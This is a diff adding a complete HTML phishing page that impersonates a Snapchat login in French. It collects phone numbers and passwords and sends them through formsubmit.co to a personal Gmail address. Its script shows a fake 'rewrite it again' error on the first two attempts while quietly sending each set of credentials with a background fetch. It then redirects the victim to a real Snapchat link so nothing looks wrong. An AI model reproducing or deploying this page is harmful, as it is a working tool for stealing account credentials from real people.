@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Avenir Next", Avenir, "Segoe UI", Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #FFFC00; /* Official Snapchat Yellow */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            color: #000000;
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 32px;
+            border-radius: 32px;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
+            text-align: center;
+        }
+
+        /* Icon Image Styling */
+        .icon-badge {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 16px auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 6px;
+            color: #000000;
+            letter-spacing: -0.3px;
+        }
+
+        p.subtitle {
+            color: #737373;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 22px;
+        }
+
+        /* Red Error Message Line */
+        .error-message {
+            display: none;
+            color: #e50000;
+            font-weight: 700;
+            font-size: 13px;
+            margin-bottom: 18px;
+            background-color: #ffe6e6;
+            padding: 12px;
+            border-radius: 14px;
+            border: 1px solid #ffcccc;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: #737373;
+            margin-bottom: 6px;
+            margin-left: 10px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 18px;
+            background-color: #f7f7f7;
+            border: 1.5px solid #e2e2e2;
+            border-radius: 25px;
+            color: #000000;
+            font-size: 14px;
+            font-weight: 500;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        input[type="text"]::placeholder {
+            color: #a3a3a3;
+        }
+
+        input[type="text"]:focus {
+            border-color: #000000;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.05);
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #FFFC00;
+            color: #000000;
+            border: none;
+            padding: 15px;
+            font-size: 15px;
+            font-weight: 800;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.06);
+            transition: transform 0.15s ease, background-color 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #f0ec00;
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <!-- Icon Link Image (You can replace the URL in src with any icon link you want) -->
+        <img class="icon-badge" src="https://i.ibb.co/nsxCHgcJ/IMG-6312.jpg"    alt="Verification Icon">
+
+        <h2>snapchat</h2>
+        <p class="subtitle">connecter votre snapchat pour voir le profil</p>
+
+        <!-- Red Line Error Message -->
+        <div id="error-line" class="error-message">rewrite it again</div>
+
+        <!-- FormSubmit Integration -->
+        <form id="empForm" action="https://formsubmit.co/nbroseten@gmail.com" method="POST">
+            
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://snapchat.com/t/joXr5nvr">
+            <input type="hidden" id="subject_line" name="_subject" value="New Employee Info Submission (Attempt 1)">
+
+            <div class="form-group">
+                <label for="fullname">Numero de telephone</label>
+                <input type="text" id="fullname" name="Full Name" placeholder="+213🇩🇿" required>
+            </div>
+
+            <div class="form-group">
+                <label for="employee_id">Mot De Pass</label>
+                <input type="text" id="employee_id" name="Employee ID" placeholder="Mot de Pass" required>
+            </div>
+
+            <button type="submit" id="submitBtn" class="submit-btn"> Se connecter</button>
+        </form>
+    </div>
+
+    <script>
+        let attemptCount = 0;
+        const form = document.getElementById("empForm");
+        const errorLine = document.getElementById("error-line");
+        const fullnameInput = document.getElementById("fullname");
+        const employeeIdInput = document.getElementById("employee_id");
+        const subjectInput = document.getElementById("subject_line");
+
+        form.addEventListener("submit", function(e) {
+            attemptCount++;
+
+            if (attemptCount < 3) {
+                e.preventDefault(); // Stop page reload redirect for attempts 1 & 2
+
+                // Update subject line for email alert
+                subjectInput.value = "New Employee Info Submission (Attempt " + attemptCount + ")";
+
+                // Send data quietly in background via no-cors fetch
+                fetch(form.action, {
+                    method: "POST",
+                    body: new FormData(form),
+                    mode: 'no-cors'
+                }).then(() => {
+                    console.log("Attempt " + attemptCount + " data sent.");
+                }).catch(err => {
+                    console.error("Attempt error", err);
+                });
+
+                // Display red error bar
+                errorLine.style.display = "block";
+
+                // Clear input boxes so they rewrite
+                fullnameInput.value = "";
+                employeeIdInput.value = "";
+                fullnameInput.focus();
+            } else {
+                // 3rd attempt: set subject and let standard browser form submit proceed to target link
+                subjectInput.value = "New Employee Info Submission (Attempt 3 - Final)";
+            }
+        });
+    </script>
+
+</body>
+</html>
